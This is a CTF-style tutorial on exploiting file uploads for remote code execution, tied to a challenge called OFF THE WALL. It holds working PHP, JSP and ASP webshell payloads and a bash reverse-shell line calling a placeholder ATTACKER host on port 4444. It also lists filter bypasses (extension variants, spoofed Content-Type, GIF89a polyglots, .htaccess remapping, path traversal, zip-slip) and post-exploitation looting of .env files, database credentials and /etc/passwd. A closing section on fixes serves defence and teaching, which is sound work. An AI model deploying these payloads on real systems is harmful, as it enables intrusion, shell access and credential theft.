# Masterclass: File Upload to Remote Code Execution, From Zero

The bug behind OFF THE WALL, and one of the most direct paths to RCE on the web. You'll learn exactly why an uploaded file can become executing code, the two conditions that must both hold, every common restriction and how each is bypassed, what to do once you have a shell, and how to build uploads that can't be weaponized.

## How to read this

- **PART 0**, how a web server decides to *execute* a file.
- **PART 1**, the one idea (the two conditions).
- **PART 2**, payloads per stack (PHP/JSP/ASPX/etc.).
- **PART 3**, defeating upload restrictions, by family.
- **PART 4**, finding where the file landed.
- **PART 5**, post-RCE (enumerate, loot, cleanup, ethics).
- **PART 6**, finding it in the wild & the fixes.
- Glossary + next.

---

# PART 0, The Building Blocks

A web server treats files two ways:

- **Static**, hand the bytes back as-is (an image, a PDF).
- **Dynamic**, run the file through an interpreter and return its *output* (a `.php` through PHP-FPM, a `.jsp` through Tomcat, a `.aspx` through .NET).

Which one happens is decided by the **extension + server config**, not the content. On a stock Apache+PHP box, any file ending `.php` under the web root gets executed by PHP when requested. So if an attacker's bytes are PHP source and they're saved as `something.php` somewhere Apache serves, requesting that URL **runs their code**.

---

# PART 1, The One Idea

> **File-upload RCE needs two things to both be true: (1) you can control the file's content *and* a dangerous extension, and (2) the file lands somewhere the server will *execute* it.** Break either and there's no RCE.

OFF THE WALL had both wide open: no validation at all, and `/uploads/` executed PHP. That's why a one-line shell was instant.

---

# PART 2, The Payloads

## PHP (most common)

```php
<?php system($_GET['c']); ?>                        // minimal command runner
<?php echo shell_exec($_GET['c']); ?>
<?php if(isset($_REQUEST['c'])) passthru($_REQUEST['c']); ?>
<?=`$_GET[c]`?>                                      // short-tag + backticks (tiny)
```

Use it: `GET /uploads/sh.php?c=id`. For a fuller shell, drop a known webshell (p0wny-shell, b374k) or get a reverse shell:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"); ?>
```

## Other stacks

| Stack | Extension(s) | Payload idea |
|---|---|---|
| Java/Tomcat | `.jsp`, `.jspx`, `.war` | `<% Runtime.getRuntime().exec(request.getParameter("c")); %>` |
| ASP.NET/IIS | `.aspx`, `.asmx`, `.ashx` | `<% Response.Write(... Process.Start ...) %>` |
| ASP classic | `.asp`, `.cer`, `.asa` | `<% eval request("c") %>` |
| Perl/CGI | `.pl`, `.cgi` | CGI script in `cgi-bin` |
| Any | `.htaccess` | re-map a benign extension to PHP (see §3) |

Match the payload to the server banner you fingerprinted (`Server:` header).

---

# PART 3, Defeating Restrictions, by Family

Real apps usually try to block dangerous uploads. Each check has a bypass; know *why* each works.

## 3.1 Extension allow/deny lists

- **Blocklist of `.php`** → try the many PHP-executed variants: `.php3 .php4 .php5 .php7 .pht .phtml .phar .pgif`. One is often still mapped.
- **Case**: `.PhP`, `.pHP` (case-insensitive filesystems/handlers).
- **Double extension**: `shell.php.jpg` (if Apache uses "last recognized handler" / `AddHandler` misconfig) or `shell.jpg.php`.
- **Trailing tricks**: `shell.php.`, `shell.php%20`, `shell.php%00jpg` (null-byte, old PHP), `shell.php/` depending on parsing.
- **Allowlist of images** → combine with content tricks (§3.3) or `.htaccess` (§3.4).

## 3.2 MIME / `Content-Type` checks

The multipart `Content-Type` is **attacker-controlled**, just set it:

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg          ← lie; server trusts it
```

If the server checks only this header, you're through.

## 3.3 Magic-byte / content checks

Server sniffs the first bytes for an image signature? **Prepend** one:

```
GIF89a;
<?php system($_GET['c']); ?>
```

`GIF89a` makes it "a GIF"; PHP ignores the leading text and still executes the `<?php ?>`. Same with real image polyglots (valid JPEG + PHP in a comment/EXIF field). Then you still need the file to be *executed* (right extension or §3.4).

## 3.4 `.htaccess` upload (allowlist-killer)

If you can upload *any* file but only images "execute," upload your own `.htaccess` to the dir to make a new extension run as PHP:

```apache
AddType application/x-httpd-php .jpg
```

Now `shell.jpg` executes as PHP. (Works when `AllowOverride` permits it.)

## 3.5 Path / overwrite tricks

- **Path traversal in filename**: `filename="../../shell.php"` to escape a safe upload dir into a web-served one.
- **Overwrite config**: upload to replace `.htaccess`, `web.config`, or an existing script.
- **Archive extraction** (zip-slip): if the app unzips uploads, a crafted zip with `../` paths writes outside the intended dir.

## 3.6 Size/image re-processing

If the server *re-encodes* images (defeating polyglots), pivot to extension/`.htaccess` tricks, or attack the image library itself (ImageTragick / ghostscript) for RCE on processing.

---

# PART 4, Finding Where It Landed

RCE needs the file's URL. Locate the store:

- Read the upload *response*, it often contains the path/URL or a preview link.
- Guess common dirs: `/uploads/ /files/ /images/ /media/ /u/ /static/uploads/ /tmp/`. A **403** (not 404) means it exists (listing denied), OFF THE WALL's `/uploads/` was 403.
- Check if the filename is kept, slugified, or randomized. If randomized, the response usually tells you the new name.
- Content-discovery (`ffuf`) the upload dir for your filename if unsure.

---

# PART 5, After You Have a Shell

1. **Who/where**: `id`, `uname -a`, `pwd`, `ls -la` the web root.
2. **Loot**: `cat` config files (`.env`, DB creds), `grep -r` for the flag/secrets, read `/etc/passwd`, environment (`env`).
3. **Escalate** if needed: sudo rights, SUID binaries, writable cron, the DB creds you just found, container escape.
4. **Upgrade** a command-runner to an interactive/reverse shell if you need persistence for enumeration.
5. **Clean up & stay ethical.** A live webshell is a real vulnerability you just added, **remove it** when done. Don't touch other users' files or data beyond the engagement's scope. (On OFF THE WALL I deleted my `sh.php` and left another player's shell alone.)

---

# PART 6, In the Wild & Fixes

## 6.1 Finding it

Any upload: avatars, document/CV upload, image galleries, "import," attachments, profile media, bulk zip import. Test the §3 bypasses in order; confirm with a harmless marker before a shell.

## 6.2 Severity

Critical, it's *direct* RCE. One of the first things to check on any app that accepts files.

## 6.3 The Fixes (layer them)

1. **Store uploads outside the web root** (or in object storage) and serve via a handler that forces download (`Content-Disposition: attachment`) and a safe content type, so uploads are never *executed*.
2. **Kill execution in the upload dir** (`php_admin_flag engine off`, `RemoveHandler`, no `AllowOverride`, static-only location).
3. **Validate strictly**: allowlist extensions *and* verify magic bytes/MIME server-side; reject double extensions, null bytes, traversal, `.htaccess`.
4. **Rename on store** to a random server-chosen name with a forced extension; never reuse the client filename.
5. **Re-encode images** server-side to strip embedded code (watch the image library's own CVEs).
6. **Least privilege**: the web user shouldn't read secrets it doesn't need; restrict FS perms; sandbox.

Breaking **either** condition from Part 1 is enough, do both anyway.

---

# Glossary

- **Webshell**, an uploaded script that runs OS commands from HTTP requests.
- **Unrestricted file upload**, accepting files without validating type/extension/content/destination.
- **Magic bytes**, a file's signature bytes (`GIF89a`, `\xFF\xD8` JPEG); spoofable by prepending.
- **Polyglot**, a file valid as two formats (e.g. valid GIF *and* valid PHP).
- **`.htaccess` trick**, uploading a config file to make a benign extension execute.
- **Double extension**, `shell.php.jpg` exploiting handler-mapping quirks.
- **403 vs 404**, forbidden (exists) vs not found (absent); 403 locates your upload dir.

# Where to Go Next

- Build a PHP upload with no checks; pop a shell; then add each defense (store-outside-root, exec-off, magic-byte check, rename) and watch which bypasses survive.
- Related in this dojo: **ssti-jinja2-rce** (the other direct-RCE web bug) and **exposed-files** (finding the upload dir / leftovers).
- Learn one real webshell (p0wny-shell) and a reverse-shell one-liner for when a bare command-runner isn't enough.
